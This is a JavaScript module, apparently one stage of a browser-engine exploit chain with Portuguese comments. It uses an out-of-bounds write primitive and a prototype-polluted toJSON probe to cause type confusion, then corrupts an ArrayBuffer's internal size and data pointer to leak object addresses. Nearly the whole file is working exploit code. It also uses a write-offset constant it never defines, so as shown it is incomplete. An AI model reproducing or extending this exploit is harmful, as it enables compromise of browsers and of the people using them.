// js/script3/testArrayBufferVictimCrash.mjs (v20_CorruptArrayBufferContents)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Precisaremos dos offsets de ArrayBufferContents

export const FNAME_MODULE_V20_CORRUPT_ABC = "OriginalHeisenbug_v20_CorruptArrayBufferContents";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256; 

let toJSON_call_details_v20 = null;
let object_to_leak_A_v20 = null; // Usado para tentar sobrescrever m_dataPointer
let object_to_leak_B_v20 = null; // Usado para tentar sobrescrever m_sizeInBytes
let victim_ab_ref_v20 = null;
let float64_view_on_victim_v20 = null; // View para ler o resultado

// Sonda com tentativa de corrupção do ArrayBufferContents
function toJSON_V20_Probe_CorruptABC() {
    toJSON_call_details_v20 = {
        probe_variant: "V20_Probe_CorruptABC",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        abc_writes_attempted: false
    };

    try {
        toJSON_call_details_v20.probe_called = true;
        toJSON_call_details_v20.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[${toJSON_call_details_v20.probe_variant}] 'this' type: ${toJSON_call_details_v20.this_type_in_toJSON}. IsVictim? ${this === victim_ab_ref_v20}`, "leak");

        if (this === victim_ab_ref_v20 && toJSON_call_details_v20.this_type_in_toJSON === '[object Object]') {
            logS3(`[${toJSON_call_details_v20.probe_variant}] HEISENBUG ON ArrayBuffer CONFIRMED! 'this' IS victim_ab_ref_v20 and type is [object Object].`, "vuln");
            logS3(`[${toJSON_call_details_v20.probe_variant}] Attempting to corrupt ArrayBufferContents via 'this'...`, "warn");

            // Quando um ArrayBuffer é tratado como JSObject, 'this[N]' acessa o butterfly.
            // O butterfly_ptr do ArrayBuffer (quando type-confused) está em JSCell+0x10.
            // Originalmente, JSCell+0x10 no ArrayBuffer é o contents_impl_pointer.
            // Então, this[N] escreve em contents_impl_ptr + N * sizeof(ptr_or_double).
            // Queremos atingir campos dentro da estrutura ArrayBufferContents.
            // Offsets dentro de ArrayBufferContents:
            // - SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START: 0x8
            // - DATA_POINTER_OFFSET_FROM_CONTENTS_START: 0x10

            // this[0] -> contents_impl_ptr + 0x00 (corrompe m_firstStrongOrSimpleWeakPtr)
            // this[1] -> contents_impl_ptr + 0x08 (corrompe m_sizeInBytes)
            // this[2] -> contents_impl_ptr + 0x10 (corrompe m_data)
            // this[3] -> contents_impl_ptr + 0x18 (corrompe m_mayBeNull)

            // Tentativa 1: Corromper m_sizeInBytes para um valor grande
            // Se object_to_leak_B_v20 for um double grande, ele será armazenado como double.
            // Se for um ponteiro, será um ponteiro tagged. Precisamos de um Int64 com valor alto.
            const new_size_val = new AdvancedInt64(0x7FFFFFFF, 0); // Tamanho grande
            logS3(`[${toJSON_call_details_v20.probe_variant}] Writing new_size_val (${new_size_val.toString(true)}) to this[1] (targeting ArrayBufferContents->m_sizeInBytes).`, "info");
            this[1] = new_size_val.asDouble(); // Escreve como double

            // Tentativa 2: Corromper m_data para apontar para object_to_leak_A_v20
            // object_to_leak_A_v20 é um objeto. Seu endereço (tagged) será escrito.
            logS3(`[${toJSON_call_details_v20.probe_variant}] Writing object_to_leak_A_v20 to this[2] (targeting ArrayBufferContents->m_dataPointer).`, "info");
            this[2] = object_to_leak_A_v20; 
            
            toJSON_call_details_v20.abc_writes_attempted = true;
            logS3(`[${toJSON_call_details_v20.probe_variant}] ArrayBufferContents corruption writes attempted.`, "info");

        } else if (this === victim_ab_ref_v20) {
            logS3(`[${toJSON_call_details_v20.probe_variant}] 'this' is victim_ab_ref_v20, but type is ${toJSON_call_details_v20.this_type_in_toJSON}. Heisenbug not active for this 'this'.`, "warn");
        }
    } catch (e) {
        toJSON_call_details_v20.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${toJSON_call_details_v20.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { probe_v20_executed: true };
}


export async function executeArrayBufferVictim_CorruptABC_Test() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V20_CORRUPT_ABC}.triggerAndCorrupt`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (ArrayBuffer Victim) & Corrupt ArrayBufferContents ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V20_CORRUPT_ABC} Inic...`;

    toJSON_call_details_v20 = null;
    victim_ab_ref_v20 = null;
    float64_view_on_victim_v20 = null;
    object_to_leak_A_v20 = { marker: "ObjA_v20_DataTarget", เป้าหมาย: "成为数据指针" }; // Objeto para o qual m_data pode apontar
    object_to_leak_B_v20 = { marker: "ObjB_v20_SizeTarget", valor: 0x7FFFFFFF }; // Objeto para representar o novo tamanho (não usado diretamente como valor)

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let read_result = { 
        success: false, 
        message: "Leitura do buffer da vítima não produziu resultado esperado.",
        value_at_0_double: null,
        value_at_0_int64: null,
        new_victim_size: -1
    };
    
    const fillPattern = 0.20202020202020;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        victim_ab_ref_v20 = new ArrayBuffer(VICTIM_AB_SIZE); 
        float64_view_on_victim_v20 = new Float64Array(victim_ab_ref_v20);
        
        for(let i = 0; i < float64_view_on_victim_v20.length; i++) {
            float64_view_on_victim_v20[i] = fillPattern + i;
        }
        logS3(`PASSO 2: victim_ab_ref_v20 (ArrayBuffer) criado. View preenchida.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V20_Probe_CorruptABC,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V20_Probe_CorruptABC.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_v20)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_v20); 
            
            logS3(`  JSON.stringify(victim_ab_ref_v20) completou. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da sonda (toJSON_call_details_v20): ${toJSON_call_details_v20 ? JSON.stringify(toJSON_call_details_v20) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnVictimConfirmed = false;
            if (toJSON_call_details_v20 && toJSON_call_details_v20.probe_called && 
                toJSON_call_details_v20.this_type_in_toJSON === "[object Object]" &&
                toJSON_call_details_v20.abc_writes_attempted) {
                heisenbugOnVictimConfirmed = true;
                logS3(`  HEISENBUG NO ARRAYBUFFER VÍTIMA CONFIRMADA E ESCRITAS ABC TENTADAS!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  ALERTA: Heisenbug no ArrayBuffer vítima NÃO confirmada ou escritas ABC não tentadas.`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("PASSO 3: Verificando victim_ab_ref_v20 APÓS tentativas de corrupção...", "warn", FNAME_CURRENT_TEST);

            read_result.new_victim_size = victim_ab_ref_v20.byteLength;
            logS3(`  Novo victim_ab_ref_v20.byteLength: ${read_result.new_victim_size} (Original: ${VICTIM_AB_SIZE})`, "leak", FNAME_CURRENT_TEST);
            if (read_result.new_victim_size > VICTIM_AB_SIZE && read_result.new_victim_size >= 0x7FFFFFFF - 1000 /* um pouco de margem */ ) {
                 logS3(`  !!!! TAMANHO DO ARRAYBUFFER VÍTIMA AUMENTADO SIGNIFICATIVAMENTE !!!!`, "vuln", FNAME_CURRENT_TEST);
                 read_result.success = true; // Sucesso parcial se o tamanho foi alterado
                 read_result.message = "Tamanho do ArrayBuffer vítima parece ter sido corrompido para um valor grande.";
            }


            // Se m_data foi sobrescrito para apontar para object_to_leak_A_v20,
            // ler do buffer da vítima agora leria a estrutura de object_to_leak_A_v20.
            // O primeiro campo de um objeto JS é geralmente o JSCell (ponteiro de estrutura + flags).
            if (float64_view_on_victim_v20.length > 0) { // Checar se a view ainda é válida
                const val_double = float64_view_on_victim_v20[0];
                read_result.value_at_0_double = val_double;
                let temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
                read_result.value_at_0_int64 = new AdvancedInt64(new Uint32Array(temp_buf)[0], new Uint32Array(temp_buf)[1]);
                logS3(`  Valor lido de float64_view_on_victim_v20[0]: ${val_double} (${read_result.value_at_0_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

                // Se m_data agora aponta para object_to_leak_A_v20, o que esperamos ler?
                // Esperaríamos ler o ponteiro da estrutura de object_to_leak_A_v20.
                // A heurística de ponteiro pode ser útil aqui.
                if (val_double !== (fillPattern + 0) && val_double !== 0 &&
                    (read_result.value_at_0_int64.high() < 0x00020000 || (read_result.value_at_0_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO (possivelmente structureID de object_to_leak_A_v20) !!!!", "vuln", FNAME_CURRENT_TEST);
                    read_result.success = true;
                    read_result.message += " Leitura de view[0] sugere que m_data foi sobrescrito para um ponteiro.";
                } else if (val_double !== (fillPattern + 0)) {
                     read_result.message += " Leitura de view[0] alterada, mas não parece ponteiro.";
                }
            } else {
                logS3("  float64_view_on_victim_v20 tem tamanho 0 ou inválido após corrupção.", "warn", FNAME_CURRENT_TEST);
                 read_result.message += " View da vítima tornou-se inválida.";
            }


            if (read_result.success) {
                document.title = `${FNAME_MODULE_V20_CORRUPT_ABC}: Corrupção ABC SUCESSO PARCIAL!`;
            } else if (heisenbugOnVictimConfirmed) {
                document.title = `${FNAME_MODULE_V20_CORRUPT_ABC}: Heisenbug OK, Corrupção ABC Falhou`;
            } else {
                 document.title = `${FNAME_MODULE_V20_CORRUPT_ABC}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_V20_CORRUPT_ABC}: Stringify/Corrupt ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_V20_CORRUPT_ABC} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado da Corrupção ABC: Success=${read_result.success}, Msg='${read_result.message}'`, read_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(read_result.value_at_0_int64){
            logS3(`  Valor em view[0] (Int64): ${read_result.value_at_0_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`  Tamanho final da vítima: ${read_result.new_victim_size}`, "leak", FNAME_CURRENT_TEST);
        
        victim_ab_ref_v20 = null; 
        float64_view_on_victim_v20 = null;
        object_to_leak_A_v20 = null;
        object_to_leak_B_v20 = null;
        toJSON_call_details_v20 = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v20, 
        corruption_attempt_result: read_result
    };
}
